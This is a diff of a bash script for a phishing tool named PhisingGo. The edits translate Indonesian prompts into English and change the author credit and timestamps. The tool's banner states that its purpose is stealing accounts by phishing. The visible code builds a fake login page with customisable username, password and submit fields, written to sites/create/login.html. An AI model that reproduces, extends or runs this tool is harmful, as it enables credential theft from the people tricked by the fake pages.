@@ -5,7 +5,7 @@
 trap 'echo;stop;exit 1' 2
 checkroot(){
 if [[ "$(id -u)" -ne 0 ]]; then
-    printf "\e[0m[\e[1;91m!\e[0m] \e[1;77mPlease, run this program as root!\n\n\e[0m"
+    printf "\e[0m[\e[1;91m!\e[0m] \e[1;77mPlease, run program as root!\n\n\e[0m"
     exit 1
 fi
 }
@@ -210,9 +210,9 @@ printf "\e[0;47;90;1m[              PhisingGo, My Github: @stepbyatepexe        
 toilet -f smslant 'PhisingGo'
 printf "
 Name        : PhisingGo
-Version     : 1.1 (Update: 30 January 2020, 3:10 AM)
+Version     : 1.1 (Update: 30 January 2020, 3:31 AM)
 Tanggal     : 20 July 2019
-Mod         : Nedi Senja
+Author      : The Linux Choice
 Purpose     : Stealing accounts using the method
               Modern Phising PhisingGo.
 Thankyou    : Allah SWT.
@@ -226,7 +226,7 @@ NB          : Humans are not perfect
 
 [ \e[4mUse this tool wisely. Thanks \e[0m] """
 sleep 1
-read -p $'\n\n\e[0m[ Tekan Enter ]' opt
+read -p $'\n\n\n\e[0m[ Back ]' opt
     if [[ $opt = '' ]]; then
         clearscreen
         banner
@@ -250,11 +250,11 @@ createpage(){
         cap1="${cap1:-${default_cap1}}"
             read -p $'\e[0m[\e[1;93m*\e[0m] \e[1;77mTitle 2 \e[0m(Default: Please login again.): \e[1;77m' cap2
             cap2="${cap2:-${default_cap2}}"
-                read -p $'\e[0m[\e[1;94m*\e[0m] \e[1;77mPengguna gagal \e[0m(Default: Username): \e[1;77m' user_text
+                read -p $'\e[0m[\e[1;94m*\e[0m] \e[1;77mUsername failed \e[0m(Default: Username): \e[1;77m' user_text
                 user_text="${user_text:-${default_user_text}}"
-                    read -p $'\e[0m[\e[1;95m*\e[0m] \e[1;77mSandi gagal \e[0m(Default: Password): \e[1;77m' pass_text
+                    read -p $'\e[0m[\e[1;95m*\e[0m] \e[1;77mPassword failed \e[0m(Default: Password): \e[1;77m' pass_text
                     pass_text="${pass_text:-${default_pass_text}}"
-                        read -p $'\e[0m[\e[1;96m*\e[0m] \e[1;77mKlik gagal \e[0m(Default: Log-In): \e[1;77m' sub_text
+                        read -p $'\e[0m[\e[1;96m*\e[0m] \e[1;77mSubmit failed \e[0m(Default: Log-In): \e[1;77m' sub_text
                         sub_text="${sub_text:-${default_sub_text}}"
         echo "<!DOCTYPE html>" > sites/create/login.html
         echo "<html>" >> sites/create/login.html
